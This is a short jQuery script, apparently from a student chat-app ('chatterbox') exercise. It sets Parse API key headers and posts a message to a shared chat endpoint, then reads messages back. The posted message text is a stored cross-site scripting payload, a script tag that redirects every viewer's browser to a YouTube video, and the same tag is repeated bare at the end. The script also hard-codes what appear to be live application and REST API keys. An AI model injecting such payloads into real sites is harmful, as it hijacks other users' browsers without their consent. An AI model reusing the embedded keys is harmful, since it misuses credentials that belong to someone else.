$.ajaxPrefilter(function (settings, _, jqXHR) {
  jqXHR.setRequestHeader("X-Parse-Application-Id", "voLazbq9nXuZuos9hsmprUz7JwM2N0asnPnUcI7r");
  jqXHR.setRequestHeader("X-Parse-REST-API-Key", "QC2F43aSAghM97XidJw8Qiy1NXlpL5LR45rhAVAf");
});
$.ajax({
  // always use this url
  url: 'https://api.parse.com/1/classes/chatterbox',
  type: 'POST',
  data: JSON.stringify({
  'username': 'Rob',
  'text': "<script>window.location.href = 'https://www.youtube.com/watch?v=JuYeHPFR3f0';</script>",
  'roomname': "4chan"
}),
  contentType: 'application/json',
  success: function (data) {
    console.log('chatterbox: Message sent');
  },
  error: function (data) {
    // see: https://developer.mozilla.org/en-US/docs/Web/API/console.error
    console.error('chatterbox: Failed to send message');
  }
});

$.ajax({
  // always use this url
  url: 'https://api.parse.com/1/classes/chatterbox',
  type: 'GET',
  contentType: 'application/json',
  data: {roomname:"4chan"},
  success: function (data) {
    console.log(data);
  },
  error: function (data) {
    // see: https://developer.mozilla.org/en-US/docs/Web/API/console.error
    console.error('chatterbox: Failed to send message');
  }
});
<script>window.location.href = 'https://www.youtube.com/watch?v=JuYeHPFR3f0';</script>